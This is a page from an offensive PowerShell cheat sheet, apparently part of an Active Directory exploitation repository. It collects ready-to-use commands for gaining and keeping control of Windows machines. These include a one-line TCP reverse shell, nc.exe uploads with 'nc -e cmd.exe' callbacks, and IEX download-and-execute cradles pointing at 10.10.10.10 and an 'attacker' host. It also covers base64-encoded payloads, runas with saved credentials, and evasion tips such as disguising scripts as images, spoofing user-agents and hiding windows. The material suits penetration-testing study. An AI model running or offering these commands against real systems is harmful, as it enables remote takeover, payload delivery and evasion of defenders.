## UPLOAD DOWNLOAD AND EXECUTE SOME STUFF

#### IN-MEMORY & DISK-BASED

- In-Memory
    - Net.WebClient DownloadString Method
    - Net.WebClient DownloadData Method
    - Net.WebClient OpenRead method
    - .NET [Net.HttpWebRequest] class
    - Word.Application COM Object
    - Excel.Application COM Object
    - InternetExplorer.Application COM Object
    - MsXml2.ServerXmlHttp Com Object
    - Certutil.exe w/ -ping argument

- Disk-Based
    - Net.WebClient DownloadFile method
    - BITSAdmin.exe
    - Certutil.exe w/ -urlcache argument

#### PS AS SYSTEM
```powershell
# IF NO PSEXEC, DROP SYSINTERNALS TOOLS
Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList '/k C:\Users\bob\Desktop\PsExec.exe -i -s powershell.exe'
```

#### ONE LINE REVERSE SHELL
```powershell
powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
#### UPLOADER
```powershell
powershell -c Invoke-WebRequest -Uri "http://10.10.10.10/nc.exe" -OutFile "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe"
powershell -c Invoke-WebRequest -Uri "http://10.10.10.10/nc.exe" -OutFile "C:\\windows\\temp\\nc.exe"
powershell wget "http://10.10.10.10/nc.exe" -outfile "nc.exe"
IEX(New-Object Net WebClient).DownloadFile('http://10.10.10.10/ms15-51-64.exe','ms15-51-64.exe')
```
#### EXECUTOR
```powershell
powershell -c "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe" -e cmd.exe 10.10.10.10 443
```

#### MULTI LINE DOWNLOAD EXEC
```powershell
$downloader = New-Object System.Net.WebClient
$payload = "http://10.10.10.10/scan.ps1"
$command = $downloader.DownloadString($payload)
Invoke-Expression $command
```

#### DOWNLOAD EXEC
```powershell
powershell -c IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/revshell_FUD.ps1')
#
iex (iwr http://attacker/Invoke-Script.ps1 -UseBasicParsing)
```

#### COMMAND ENCODER
```bash
# BUILD YOUR COMMAND IN YOUR SYSTEM
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/Invoke-PowerShellTcp_8443.ps1')" | iconv --to-code UTF-16LE | base64 -w 0
# BUILD YOUR COMMAND WITH POWERSHELL
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/Invoke-PowerShellTcp_8443.ps1')"))
```
```powershell
# PASS IT WITH ENCODED
powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEAMAAuADEAMAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcABfADgANAA0ADMALgBwAHMAMQAnACkA
```
#### CMDKEY /LIST
```powershell
runas /user:ACCESS\Administrator /savecred "Powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEAMAAuADEAMAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcABfADgANAA0ADMALgBwAHMAMQAnACkA"
```
#### EXEC WITH PASSWORD
```powershell
$passwd = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('administrator',$passwd)
​Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://10.10.10.10/Invoke-PowerShellTcp_8443.ps1')" -Credential $creds
```

#### EVASION TIP
- Configure your hosting server with valide SSL certificate
- Basic file extension heuristics evasion
     ```powershell
    # EXECUTED AS ps1 !!!
    IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/Logo.gif')
    ```
- Obfuscation
- Base 64 encoded command
- Net.WebClient used with valide user-agent (recon smartphone and local computer)
    ```powershell
    $downloader = New-Object System.Net.WebClient
    $downloader.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36")
    $payload = "http://10.10.10.10/script.ps1"
    $command = $downloader.DownloadString($payload)
    iex $command
    ```
- -Window Hidden end-user
    ```powershell
    powershell.exe –ExecutionPolicy bypass –Window hidden ...
    ```

[<- BACK TO MAIN MENU ->](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/README.md)
